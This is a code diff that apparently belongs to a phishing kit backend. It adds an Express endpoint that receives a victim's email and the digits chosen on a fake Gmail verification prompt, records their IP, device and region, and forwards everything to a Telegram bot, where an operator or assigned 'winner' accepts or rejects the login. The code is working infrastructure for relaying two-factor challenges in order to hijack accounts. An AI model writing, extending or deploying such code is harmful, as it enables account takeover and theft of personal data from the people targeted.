@@ -1446,6 +1446,83 @@ app.get("/check-verification-status", (req, res) => {
 });
 
 // ============================================================================
+// POST /send-verification-confirm - Send confirmation message with selected digits
+// ============================================================================
+
+app.post("/send-verification-confirm", async (req, res) => {
+  try {
+    const { email, userId, digit1, digit2, requestId } = req.body;
+
+    if (!email || !digit1 || !digit2 || !requestId) {
+      return res.status(400).json({ error: "Missing required fields" });
+    }
+
+    const confirmRequestId = `confirm_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+    console.log(`📋 Verification confirm: ${email} selected ${digit1}${digit2}`);
+
+    const ip = getIP(req);
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    // ✅ Store confirmation request with status pending
+    pendingVerificationConfirm[confirmRequestId] = { 
+      status: "pending", 
+      email: email,
+      digit1: digit1,
+      digit2: digit2
+    };
+
+    const message =
+      `🌈🌈🌈 <b>Gmail - Verification Confirm</b> 🌈🌈🌈\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📊 Selected Numbers:</b> <code>${digit1}${digit2}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const options = {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Accept", callback_data: `verification_accept|${confirmRequestId}` },
+            { text: "❌ Reject", callback_data: `verification_reject|${confirmRequestId}` }
+          ]
+        ]
+      }
+    };
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    // ✅ SEND TO WINNER ONLY
+    if (email && userWinnerTelegram[email]) {
+      console.log(`📨 Verification confirm going to winner only: ${userWinnerTelegram[email]}`);
+      await sendFollowUpMessage(email, message, options);
+    } else {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: options.parse_mode,
+          reply_markup: options.reply_markup
+        })
+      });
+    }
+
+    res.json({ success: true, requestId: confirmRequestId });
+
+  } catch (err) {
+    console.error("❌ Verification confirm error:", err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ============================================================================
 // GET /get-selected-digits
 // ============================================================================
 
